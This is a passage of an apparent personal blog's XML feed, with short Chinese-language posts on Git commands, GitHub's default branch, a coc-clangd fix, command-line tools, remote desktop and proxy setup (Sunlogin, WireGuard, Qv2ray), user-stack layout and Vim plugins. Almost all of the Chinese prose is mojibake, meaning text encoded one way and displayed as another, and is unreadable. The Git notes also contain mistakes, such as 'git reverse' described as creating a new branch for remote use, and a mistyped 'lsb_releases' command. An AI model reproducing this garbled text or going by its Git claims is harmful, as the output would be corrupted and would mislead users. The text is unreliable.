    <content type="html"><![CDATA[<p><a href="https://learngitbranching.js.org/">learngitbranching</a></p><h1 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h1><p>è¿™é‡Œæœ‰ä¸€å¼ å›¾ç‰‡:<br><img src="/../img/2022-09-25_07-59.png" alt="Rebase"></p><p>Rebase å…¶å®ç†è§£èµ·æ¥å°±æ˜¯, å°†ä¸€ä¸ªåˆ†æ”¯çš„æ‰€æœ‰å·¥ä½œ, ä»¥å¦ä¸€ä¸ªåˆ†æ”¯ä¸ºèµ·ç‚¹æäº¤. <code>git rebase [ä¸€ä¸ªåˆ†æ”¯å]</code>, è¿™é‡Œé€‰å–çš„åˆ†æ”¯å°±æ˜¯ä½œä¸ºæ–°çš„èµ·ç‚¹.</p><h1 id="Detach-HEAD"><a href="#Detach-HEAD" class="headerlink" title="Detach HEAD"></a>Detach HEAD</h1><p>ä¸ºä»€ä¹ˆå« Detach å‘¢? å› ä¸º HEAD å’Œåˆ†æ”¯åˆ†ç¦»äº†, æŒ‡å‘äº†ä¸€ä¸ª commit.</p><h1 id="Relative-refs"><a href="#Relative-refs" class="headerlink" title="Relative refs"></a>Relative refs</h1><p>é€šè¿‡æäº¤çš„ç›¸å¯¹ä½ç½®æ¥ç§»åŠ¨ HEAD æŒ‡é’ˆ, è€Œä¸æ˜¯ç”¨ Hash å€¼.</p><ul><li>å‘ä¸Šä¸€æ¬¡ç”¨ <code>^</code></li><li>å‘ä¸Šå¤šæ¬¡ç”¨ <code>~&lt;num&gt;</code></li></ul><p>å¦‚:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git checkout main^<br></code></pre></td></tr></table></figure><p>ç”¨ HEAD æŒ‡é’ˆé€€å›:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git checkout C3<br><span class="hljs-variable">$ </span>git checkout HEAD^<br></code></pre></td></tr></table></figure><p>å¼ºåˆ¶ä¸€ä¸ª branch ç§»åŠ¨:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> git branch <span class="hljs-operator">-f</span> main HEAD~<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>main ä¼šå›é€€åˆ° HEAD æŒ‡é’ˆçš„ 3 æ¬¡æäº¤å‰.</p><h1 id="Reverse-Changes-in-Git"><a href="#Reverse-Changes-in-Git" class="headerlink" title="Reverse Changes in Git"></a>Reverse Changes in Git</h1><p>ä¸¤ä¸ªæ–¹æ³•:</p><ul><li>reset</li><li>revert</li></ul><p><code>git reset</code>, ç”¨äº local, å…¶å®å°±æ˜¯å›é€€, å¦‚ <code>git reset HEAD~3</code>.</p><p><code>git reverse</code> ç”¨äº remote, è¿™ä¸ªå‘½ä»¤ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ branch æ¥ä»‹ç»æ”¹å˜çš„å†…å®¹.</p><h1 id="Git-Cherry-pick"><a href="#Git-Cherry-pick" class="headerlink" title="Git Cherry-pick"></a>Git Cherry-pick</h1><p>çœ‹å‘½ä»¤çš„åå­—å°±çŸ¥é“, æˆ‘ä»¬å½“å‰ HEAD æ‰€åœ¨åˆ†æ”¯æƒ³è¦è·å–å…¶ä»– commit çš„å†…å®¹, æ¯”å¦‚ c2, c4, é‚£ä¹ˆ:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$ git cherry-pick <span class="hljs-built_in">c2</span> <span class="hljs-built_in">c4</span><br></code></pre></td></tr></table></figure><p>å°±ä¼šè®© HEAD æ‰€åœ¨åˆ†æ”¯å‰è¿›ä¸¤æ­¥, è·å– c2 å’Œ c4 ä¸¤æ¬¡ commit çš„å†…å®¹.</p><h1 id="Git-Interactive-Rebase"><a href="#Git-Interactive-Rebase" class="headerlink" title="Git Interactive Rebase"></a>Git Interactive Rebase</h1><p>ä¹Ÿå°±æ˜¯ä½¿ç”¨ <code>git rebase</code> çš„ <code>-i</code> é€‰é¡¹.</p><p>å¦‚:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git rebase -i HEAD~<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>HEAD æŒ‡é’ˆå°±ä¼šä»¥å‰ç¬¬ 4 æ¬¡æäº¤ä¸º base, ç„¶ä¼šä¼šç”¨ vim (æˆ–è€…å…¶ä»–) æ‰“å¼€ä¸€ä¸ªç•Œé¢, é€‰æ‹©åˆšæ‰è¶Šè¿‡çš„å››ä¸ªé‡Œé¢å“ªäº› commit æ˜¯éœ€è¦çš„. åœ¨ä½ æŠŠæŸäº› commit é€‰æ‹©ä¸ºéœ€è¦ååˆ™ä¼šåœ¨è¿™ä¸ª base ä¸Šåˆå¹¶å‰è¿›.</p><p>è¿˜å¯ä»¥è°ƒæ•´ commit çš„é¡ºåºç­‰.</p><p><code>git commit --amend</code> å¯ä»¥è¿½åŠ æäº¤.</p><h1 id="Git-Tags"><a href="#Git-Tags" class="headerlink" title="Git Tags"></a>Git Tags</h1><p>ä¸èƒ½ checkout ä¸€ä¸ª tag ç„¶ååœ¨ä¸Šé¢å·¥ä½œ (æ„æ€æ˜¯ branch çš„åå­—ä¸æ˜¯å« tag). è‹¥è¦ç»™ c1 æ·»åŠ ä¸€ä¸ª v1 çš„ tag:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ git <span class="hljs-keyword">tag</span> <span class="hljs-title">v1</span> c1<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨ tag è·³è½¬.</p><h1 id="Git-Describe"><a href="#Git-Describe" class="headerlink" title="Git Describe"></a>Git Describe</h1><p><code>git describe</code> è¿™ä¸ªå‘½ä»¤å¯ä»¥æè¿°, æŸä¸€ä¸ª commit è·ç¦»å…¶æœ€è¿‘çš„ tag çš„ä¸€äº›ç›¸å…³ä¿¡æ¯, å¦‚ç›¸éš”å¤šå°‘ä¸ª commit, ä»¥åŠè¿™ä¸€ä¸ª commit çš„ hash å€¼.</p><h1 id="Specifying-Parents"><a href="#Specifying-Parents" class="headerlink" title="Specifying Parents"></a>Specifying Parents</h1><h1 id="Git-Remote-Branches"><a href="#Git-Remote-Branches" class="headerlink" title="Git Remote Branches"></a>Git Remote Branches</h1><p>æ‹‰å»ä¸‹æ¥çš„åˆ†æ”¯ç§°ä¸ºè¿œç¨‹åˆ†æ”¯. åç§°æ ¼å¼ä¸º <code>&lt;remote name&gt;/&lt;branch name&gt;</code>, è¿œç¨‹åˆ†æ”¯åªæœ‰è¿œç¨‹ä»“åº“æ›´æ–°äº†æ‰ä¼šæ›´æ–°, ä¸ç„¶ä¸ä¼šç§»åŠ¨, ç§»åŠ¨çš„åªæ˜¯ HEAD.</p><h1 id="Git-Fetch"><a href="#Git-Fetch" class="headerlink" title="Git Fetch"></a>Git Fetch</h1><p><code>git fetch</code> è¿™ä¸ªå‘½ä»¤å¯ä»¥æ›´æ–°è¿œç¨‹åˆ†æ”¯. ä½†ä¸ä¼šæ›´æ”¹ local çš„çŠ¶æ€.</p><h1 id="Git-Pull"><a href="#Git-Pull" class="headerlink" title="Git Pull"></a>Git Pull</h1><p><code>git pull</code> å‘½ä»¤ä¸ä»…è·Ÿæ–°è¿œç¨‹åˆ†æ”¯, è¿˜ä¼šå°†å…¶å’Œ local çš„åˆ†æ”¯ merge.</p><h1 id="Simulating-colaboration"><a href="#Simulating-colaboration" class="headerlink" title="Simulating colaboration"></a>Simulating colaboration</h1><p><code>git fakeTeamwork</code> å‡è®¾è¿œç«¯è·Ÿæ–°, å¯ä»¥æŒ‡å®š branch name å’Œ commit ä¸ªæ•°:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git fakeTeamwork foo <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h1 id="Git-Push"><a href="#Git-Push" class="headerlink" title="Git Push"></a>Git Push</h1><p><code>git push</code> ä¸åŠ å‚æ•°, æ‰€ä¾æ®çš„æ˜¯ <code>push.default</code> çš„å†…å®¹. ä¸”æœ¬åœ°çš„è¿œç¨‹åˆ†æ”¯ä¹Ÿä¼šæ›´æ–°.</p><h1 id="Diverged-Work"><a href="#Diverged-Work" class="headerlink" title="Diverged Work"></a>Diverged Work</h1><p><code>git pull --rebase</code> ç›¸å½“äºå…ˆ <code>fetch</code> ç„¶åå† <code>rebase</code>. å…¶ä»¥è¿œç¨‹åˆ†æ”¯çš„èŠ‚ç‚¹ä¸º base.</p><h1 id="Remote-Rejected"><a href="#Remote-Rejected" class="headerlink" title="Remote Rejected"></a>Remote Rejected</h1><p>local æ›´æ”¹çš„èµ·ç‚¹å’Œ remote ä¸åŒ.</p><p>å³é‡åˆ° <code>! [remote rejected] main -&gt; main (TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.)</code> è¿™ç§æŠ¥é”™.</p><h1 id="Mergin-feature-branches"><a href="#Mergin-feature-branches" class="headerlink" title="Mergin feature branches"></a>Mergin feature branches</h1><p>å°† feature åˆ†æ”¯å†…å®¹ merge åˆ° main åˆ†æ”¯ä¸­.</p><h1 id="Remote-Tracking-branches"><a href="#Remote-Tracking-branches" class="headerlink" title="Remote-Tracking branches"></a>Remote-Tracking branches</h1><p>é»˜è®¤æƒ…å†µä¸‹, <code>git pull</code> ä¹‹å main åˆ†æ”¯ä¼šç§»åŠ¨.</p><h1 id="Push-Arguments"><a href="#Push-Arguments" class="headerlink" title="Push Arguments"></a>Push Arguments</h1><p>æ ¼å¼ä¸º <code>git push &lt;remote&gt; &lt;place&gt;</code></p><h1 id="lt-place-gt-Argument-Details"><a href="#lt-place-gt-Argument-Details" class="headerlink" title="&lt;place&gt; Argument Details"></a><code>&lt;place&gt; Argument Details</code></h1><p>å°† local ä¸Šçš„ä¸€ä¸ª branch æäº¤åˆ° remote ä¸Šçš„ä¸åŒ branch.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>git push origin &lt;source&gt;<span class="hljs-symbol">:&lt;destination&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Git-fetch-arguments"><a href="#Git-fetch-arguments" class="headerlink" title="Git fetch arguments"></a>Git fetch arguments</h1><p>å¦‚:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git fetch origin foo<br></code></pre></td></tr></table></figure><p>è®¾ç½®å’Œæ›´æ”¹ remote tracking, ä½¿ç”¨ <code>git branch -u o/main foo</code> å°±è®¾ç½® foo æ¥ track o&#x2F;main</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Github-é»˜è®¤åˆ†æ”¯</title>
    <link href="/2022/09/25/%E5%85%B3%E4%BA%8E-Github-%E9%BB%98%E8%AE%A4%E5%88%86%E6%94%AF/"/>
    <url>/2022/09/25/%E5%85%B3%E4%BA%8E-Github-%E9%BB%98%E8%AE%A4%E5%88%86%E6%94%AF/</url>
    
    <content type="html"><![CDATA[<p>ä»ä»¥å‰çš„ master åˆ†æ”¯å˜æˆäº† main åˆ†æ”¯.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³-coc-clangd-was-not-found-on-your-PATH-é—®é¢˜</title>
    <link href="/2022/09/23/%E8%A7%A3%E5%86%B3-coc-clangd-was-not-found-on-your-PATH-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/23/%E8%A7%A3%E5%86%B3-coc-clangd-was-not-found-on-your-PATH-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>å¯èƒ½è¿˜æ˜¯ç½‘ç»œçš„é—®é¢˜, æŸ¥çœ‹äº† <code>~/.config/coc/extensions/coc-clangd-data/install</code> ç›®å½•, ç»“æœä¸ºç©º, å› æ­¤ç›´æ¥ä» <a href="https://clangd.llvm.org/">å®˜ç½‘</a> ä¸‹è½½.</p><p>ä¹‹åå°†è§£å‹åç›®å½•ä¸‹çš„ bin ç›®å½•çš„è·¯å¾„æ·»åŠ åˆ° PATH ä¸­.</p>]]></content>
    
    
    <categories>
      
      <category>VIm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è¿œç¨‹æ¡Œé¢æ§åˆ¶è½¯ä»¶-parsec</title>
    <link href="/2022/09/22/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%8E%A7%E5%88%B6%E8%BD%AF%E4%BB%B6-parsec/"/>
    <url>/2022/09/22/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%8E%A7%E5%88%B6%E8%BD%AF%E4%BB%B6-parsec/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å‡ ä¸ªå¥½ç”¨çš„å‘½ä»¤è¡Œè½¯ä»¶</title>
    <link href="/2022/09/22/%E5%87%A0%E4%B8%AA%E5%A5%BD%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BD%AF%E4%BB%B6/"/>
    <url>/2022/09/22/%E5%87%A0%E4%B8%AA%E5%A5%BD%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BD%AF%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="cppman"><a href="#cppman" class="headerlink" title="cppman"></a>cppman</h1><p>C&#x2F;C++ çš„æ‰‹å†Œ.</p><h1 id="cgasm"><a href="#cgasm" class="headerlink" title="cgasm"></a>cgasm</h1><p>æŸ¥è¯¢æ±‡ç¼–æŒ‡ä»¤.</p><h1 id="owncloud"><a href="#owncloud" class="headerlink" title="owncloud"></a>owncloud</h1><h1 id="ncdu"><a href="#ncdu" class="headerlink" title="ncdu"></a>ncdu</h1><p>åŸºäº ncurses çš„ç©ºé—´åˆ†æç¨‹åº.</p><h1 id="glances"><a href="#glances" class="headerlink" title="glances"></a>glances</h1><p>æ›¿ä»£ htop å’Œ top.</p><h1 id="dstat"><a href="#dstat" class="headerlink" title="dstat"></a>dstat</h1><p>æ›¿ä»£ vmstat.</p><h1 id="cheat"><a href="#cheat" class="headerlink" title="cheat"></a>cheat</h1><p>å‘½ä»¤è¡Œç¬”è®°.</p><h1 id="bro"><a href="#bro" class="headerlink" title="bro"></a>bro</h1><p>å¸®åŠ©ç³»ç»Ÿ.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºå­¦é•¿å¸®å¿™ä»£ç†</title>
    <link href="/2022/09/22/%E5%85%B3%E4%BA%8E%E5%AD%A6%E9%95%BF%E5%B8%AE%E5%BF%99%E4%BB%A3%E7%90%86/"/>
    <url>/2022/09/22/%E5%85%B3%E4%BA%8E%E5%AD%A6%E9%95%BF%E5%B8%AE%E5%BF%99%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆè®²ä¸‹è¿œç¨‹è¿æ¥:</p><h1 id="å‘æ—¥è‘µ"><a href="#å‘æ—¥è‘µ" class="headerlink" title="å‘æ—¥è‘µ"></a>å‘æ—¥è‘µ</h1><p>ä¹Ÿå°±æ˜¯ sunloginclient è¿™ä¸ªè½¯ä»¶, å¯ä»¥åœ¨ aur ä¸Šæ‰¾åˆ°, åˆ©ç”¨ yay ä¸‹è½½:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S sunloginclient</span><br></code></pre></td></tr></table></figure><p>ä¹‹åéœ€è¦å¯åŠ¨ <code>runsunloginclient</code> è¿™ä¸ªæœåŠ¡:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo systemctl <span class="hljs-literal">start</span> runsunloginclient<br></code></pre></td></tr></table></figure><p>æ‰“å¼€è½¯ä»¶åé‡Œé¢æœ‰ä¸¤ä¸ªç :</p><ul><li>è¯†åˆ«ç </li><li>éªŒè¯ç <br>è¿™ä¿©ä¸ªç ç”¨äºè¿æ¥.</li></ul><h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>å¦‚æœæ²¡æœ‰å…¬ç½‘ IP, ä¸åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘ä¸‹çš„ä¸»æœºä¸èƒ½å¤Ÿè¢«è¿æ¥åˆ°.</p><h1 id="wireguard"><a href="#wireguard" class="headerlink" title="wireguard"></a>wireguard</h1><p>çœ‹å¦ä¸€ç¯‡æ–‡ç« .</p><p>å…¶ä¸­æœ‰ä¸€ä¸ªæŠ¥é”™:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin/wg-quick: line <span class="hljs-number">32</span>: resolvconf: command not found<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´æœ‰ä¸€ä¸ªå‘½ä»¤æ²¡æœ‰è¢«æ‰¾åˆ°, ä¸‹è½½å°±å¥½:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S resolvconf</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>sudo wg-quick up wg0</code> æ“ä½œä¹‹å, æœ‰:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo netstat -ntpl</span><br></code></pre></td></tr></table></figure><p>çš„æ“ä½œ.</p><h1 id="qv2ray"><a href="#qv2ray" class="headerlink" title="qv2ray"></a>qv2ray</h1><p>è§å¦ä¸€ç¯‡æ–‡ç« .</p><h1 id="Proxy-SwitchOmega"><a href="#Proxy-SwitchOmega" class="headerlink" title="Proxy SwitchOmega"></a>Proxy SwitchOmega</h1><p>firefox ä¸Šé¢ä¸‹è½½çš„ä¸€ä¸ªæ’ä»¶, åœ¨é‡Œé¢é…ç½®äº†ä¸€éƒ¨åˆ†.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Qv2ray</title>
    <link href="/2022/09/22/%E5%85%B3%E4%BA%8E-Qv2ray/"/>
    <url>/2022/09/22/%E5%85%B3%E4%BA%8E-Qv2ray/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Qv2ray">å‚è€ƒ ArchWiki</a><br><a href="https://qv2ray.net/lang/zh/getting-started/step2.html#%E4%B8%8B%E8%BD%BD-v2ray-%E6%A0%B8%E5%BF%83%E6%96%87%E4%BB%B6">å®˜æ–¹</a></p><p>Qv2ray æ˜¯ä¸€ä¸ªä½¿ç”¨ Qt ç¼–å†™çš„è·¨å¹³å°çš„ V2Ray å›¾å½¢å‰ç«¯, å¯ä»¥åœ¨å›¾å½¢åŒ–ç•Œé¢ä¸­æ–¹ä¾¿åœ°é…ç½®ä»£ç†.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><h2 id="Arch-ä¸‹å®‰è£…"><a href="#Arch-ä¸‹å®‰è£…" class="headerlink" title="Arch ä¸‹å®‰è£…"></a>Arch ä¸‹å®‰è£…</h2><p>éœ€è¦å…ˆé…ç½® Archlinuxcn.</p><p>å®‰è£… <code>qv2ray</code> è½¯ä»¶åŒ…. å¯¹äºå¼€å‘ç‰ˆæœ¬, å®‰è£… <code>qv2ray-dev-git</code>:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> pacman -S qv2ray-dev-git<br></code></pre></td></tr></table></figure><h2 id="Ubuntu-ä¸‹"><a href="#Ubuntu-ä¸‹" class="headerlink" title="Ubuntu ä¸‹"></a>Ubuntu ä¸‹</h2><p>å…ˆå¯¼å…¥ GPG å¯†é’¥:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl https://qv2ray.net/debian/pubkey.gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/qv2ray-stable-archive.gpg<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl https://raw.fastgit.org/Qv2ray/debian/master/pubkey.gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/qv2ray-stable-archive.gpg<br><br></code></pre></td></tr></table></figure><p>å†æ·»åŠ  APT è½¯ä»¶æº:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [arch=amd64] https://qv2ray.net/debian/ `lsb_releases -cs` main&quot;</span> | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/qv2ray.list<br></code></pre></td></tr></table></figure><p>æ›´æ–°ä¹‹åå°±å¯ä»¥ç›´æ¥å®‰è£…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo apt update<br>$ sudo apt install qv2ray<br></code></pre></td></tr></table></figure><h1 id="é…ç½®-V2RayCore"><a href="#é…ç½®-V2RayCore" class="headerlink" title="é…ç½® V2RayCore"></a>é…ç½® V2RayCore</h1><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p><a href="https://qv2ray.net/lang/zh/manual/">æ‰‹å†Œ</a></p><p>é…ç½®æ–‡ä»¶åœ¨ <code>~/.config/qv2ray/</code> ç›®å½•ä¸‹.</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p><a href="https://qv2ray.net/lang/zh/">å®˜æ–¹æ–‡æ¡£</a>.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ ˆç©ºé—´åˆ†é…å’Œæ ˆå¯¹é½è®¿é—®</title>
    <link href="/2022/09/22/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%88%86%E9%85%8D%E5%92%8C%E6%A0%88%E5%AF%B9%E9%BD%90%E8%AE%BF%E9%97%AE/"/>
    <url>/2022/09/22/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%88%86%E9%85%8D%E5%92%8C%E6%A0%88%E5%AF%B9%E9%BD%90%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/qinghaowusu/p/14081097.html">å‚è€ƒ</a></p><h2 id="ç”¨æˆ·æ ˆåœ¨ç³»ç»Ÿä¸­çš„ä½ç½®"><a href="#ç”¨æˆ·æ ˆåœ¨ç³»ç»Ÿä¸­çš„ä½ç½®" class="headerlink" title="ç”¨æˆ·æ ˆåœ¨ç³»ç»Ÿä¸­çš„ä½ç½®"></a>ç”¨æˆ·æ ˆåœ¨ç³»ç»Ÿä¸­çš„ä½ç½®</h2><p>å¯¹äº Linux å†…æ ¸è€Œè¨€, å°†æ•´ä¸ªå†…å­˜ç©ºé—´åˆ’åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†, Kernel Space å’Œ User Space, å‰è€…ç”¨äºæ”¯æ’‘ Linux Kernel æœ¬èº«çš„è¿è¡Œæ‰€éœ€çš„ç©ºé—´, åè€…å°±æ˜¯ç”¨äºæ”¯æŒç”¨æˆ·ç¨‹åºæ‰€éœ€çš„è¿è¡Œç©ºé—´. ç”¨æˆ·æ ˆå°±æ˜¯ä½äºç”¨æˆ·ç©ºé—´, ä¸€èˆ¬ä½äºç”¨æˆ·ç©ºé—´çš„æœ€é«˜éƒ¨åˆ†, å‘ä½åœ°å€å¤„å¢é•¿.</p><p>é¦–å…ˆæœ‰ä¸€å—å†…å­˜, ä¸€ç‰‡åŒºåŸŸç”¨æ¥è¿è¡Œå†…æ ¸ä»£ç , å¦ä¸€ç‰‡åŒºåŸŸç”¨æ¥ç»™æˆ‘ä»¬ä½¿ç”¨.</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ultisnippet-å’Œ-coc-å†²çª</title>
    <link href="/2022/09/21/Ultisnippet-%E5%92%8C-coc-%E5%86%B2%E7%AA%81/"/>
    <url>/2022/09/21/Ultisnippet-%E5%92%8C-coc-%E5%86%B2%E7%AA%81/</url>
    
    <content type="html"><![CDATA[<p>å› ä¸ºä¸¤ä¸ªæ’ä»¶çš„é»˜è®¤å±•å¼€é”®éƒ½æ˜¯ <tab>, å› æ­¤, å°† <code>Ultisnippet</code> çš„å±•å¼€é”®æ›´æ¢å°±å¥½.</p><p>ä½¿ç”¨ <code>:verbose</code> å‘½ä»¤æŸ¥çœ‹:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">verbose</span> <span class="hljs-keyword">imap</span> <span class="hljs-symbol">&lt;tab&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vim-ä¸­å‡ ä¸ªæ’ä»¶çš„ä½¿ç”¨</title>
    <link href="/2022/09/20/vim-%E4%B8%AD%E5%87%A0%E4%B8%AA%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/20/vim-%E4%B8%AD%E5%87%A0%E4%B8%AA%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="vim-startify"><a href="#vim-startify" class="headerlink" title="vim-startify"></a>vim-startify</h1><p>æä¾›ä¸€ä¸ª vim å’Œ nvim çš„ start ç•Œé¢.</p><p>å¯é…ç½®, å…·ä½“çœ‹ <a href="https://github.com/mhinz/vim-startify/wiki/Example-configurations">github ç›¸å…³</a>.</p><h1 id="SimpylFold"><a href="#SimpylFold" class="headerlink" title="SimpylFold"></a>SimpylFold</h1><p>ç”¨äºæŠ˜å  python ä»£ç .</p><p>æœ‰éƒ¨åˆ†é…ç½®é€‰é¡¹, å…·ä½“çœ‹ <a href="https://github.com/tmhedberg/SimpylFold">github ç›¸å…³</a>.</p><p>ä½¿ç”¨ä¸Šè¿˜æ˜¯ç”¨ vim åŸæ¥çš„ <code>zc</code> æ¥ close a fold, <code>zo</code> æ¥ open one.</p><p>é€šè¿‡ <code>:help fold-commands</code> æ¥æŸ¥çœ‹ç›¸å…³ä¿¡æ¯.</p><h1 id="tcomment-vim"><a href="#tcomment-vim" class="headerlink" title="tcomment_vim"></a>tcomment_vim</h1><p>å¯ä»¥å°†ä¸€æ®µæ–‡æœ¬æ³¨é‡Šæ‰, ä»¥åŠå–æ¶ˆæ³¨é‡Š.</p><p>å¦‚æœ file-type åŠŸèƒ½æ­£å¸¸å·¥ä½œ, TComment å°±çŸ¥é“ç”¨ä»€ä¹ˆç¬¦å·æ¥æ³¨é‡Šæ–‡æœ¬.</p><p>å…·ä½“æŒ‰é”®çœ‹ init.vim.</p><h1 id="Semshi"><a href="#Semshi" class="headerlink" title="Semshi"></a>Semshi</h1><p>å…·ä½“çœ‹ <a href="https://github.com/numirias/semshi">github ç›¸å…³</a>.</p><p>åœ¨ neovim ä¸­æä¾› Python çš„è¯­æ³•é«˜äº®. éœ€è¦åç¼€ä¸º <code>.py</code> çš„æ–‡ä»¶.</p><h1 id="vim-illuminate"><a href="#vim-illuminate" class="headerlink" title="vim-illuminate"></a>vim-illuminate</h1><p>ç”¨æ¥é«˜äº® cursor ä¸‹çš„ word.</p><p>é»˜è®¤æ˜¯ç”¨ <code>&lt;a-n&gt;</code> å’Œ <code>&lt;a-p&gt;</code> æ¥åœ¨ references ä¹‹é—´ç§»åŠ¨.</p><h1 id="vim-diff-å’Œ-vim-diff-enhanced"><a href="#vim-diff-å’Œ-vim-diff-enhanced" class="headerlink" title="vim-diff å’Œ vim-diff-enhanced"></a>vim-diff å’Œ vim-diff-enhanced</h1><h1 id="vim-projectionist"><a href="#vim-projectionist" class="headerlink" title="vim-projectionist"></a>vim-projectionist</h1><h1 id="nerdtree-çš„é…ç½®"><a href="#nerdtree-çš„é…ç½®" class="headerlink" title="nerdtree çš„é…ç½®"></a>nerdtree çš„é…ç½®</h1><h1 id="vim-which-key"><a href="#vim-which-key" class="headerlink" 